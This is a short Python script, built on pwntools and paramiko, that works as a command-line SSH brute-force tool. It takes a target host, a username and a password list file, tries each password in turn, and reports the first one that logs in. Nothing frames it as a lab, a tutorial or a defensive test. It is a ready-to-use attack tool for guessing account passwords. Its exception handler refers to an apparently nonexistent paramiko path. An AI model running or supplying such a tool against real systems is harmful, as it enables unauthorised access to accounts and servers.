from pwn import *
import paramiko
import argparse

# Function to perform SSH brute-forcing
def ssh_bruteforce(host, username, password_list_file):
    attempts = 0
    
    with open(password_list_file, "r") as password_list:
        for password in password_list:
            password = password.strip("\n")
            try:
                print("[{}] Attempting password: '{}'".format(attempts, password))
                response = ssh(host=host, user=username, password=password, timeout=1)
                
                if response.connected():
                    print("[>] Valid password found: '{}'!".format(password))
                    response.close()
                    break
                
                response.close()
            except paramiko.ssh.AuthenticationException:
                print("[X] Invalid password!")
            
            attempts += 1

# Argument parser for command-line arguments
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SSH Bruteforce Tool")
    parser.add_argument("-H", "--host", required=True, help="Target host")
    parser.add_argument("-l", "--login", required=True, help="Username for SSH")
    parser.add_argument("-P", "--passwords", required=True, help="File containing the list of passwords")

    args = parser.parse_args()

    # Call the SSH brute-force function with the provided arguments
    ssh_bruteforce(args.host, args.login, args.passwords)
